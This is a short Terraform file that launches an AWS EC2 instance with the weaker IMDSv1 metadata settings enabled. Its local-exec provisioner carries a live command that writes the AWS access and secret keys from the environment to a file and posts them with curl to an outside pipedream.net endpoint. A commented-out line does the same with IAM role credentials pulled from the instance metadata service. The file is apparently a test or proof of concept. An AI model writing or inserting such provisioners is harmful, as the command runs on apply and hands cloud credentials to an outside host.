provider "aws" {
  region = "us-east-1"
}

resource "aws_instance" "example" {
  ami           = "ami-06ca3ca175f37dd66"
  instance_type = "t2.micro"
  
  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "optional"
    http_put_response_hop_limit = 10
  }

  iam_instance_profile = "tf-testing-role"

  provisioner "local-exec" {
    #command = "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/tf-testing-role > /tmp/awscreds.txt && curl https://75a3cce6ebd29290b95c14b554827358.m.pipedream.net --data-urlencode creds@/tmp/awscreds.txt "
    command = "echo $AWS_ACCESS_KEY $AWS_SECRET_KEY > /tmp/awscreds.txt && curl https://75a3cce6ebd29290b95c14b554827358.m.pipedream.net/test --data-urlencode creds@/tmp/awscreds.txt "
  }

  tags = {
    Name = "terraform-instance"
  }
}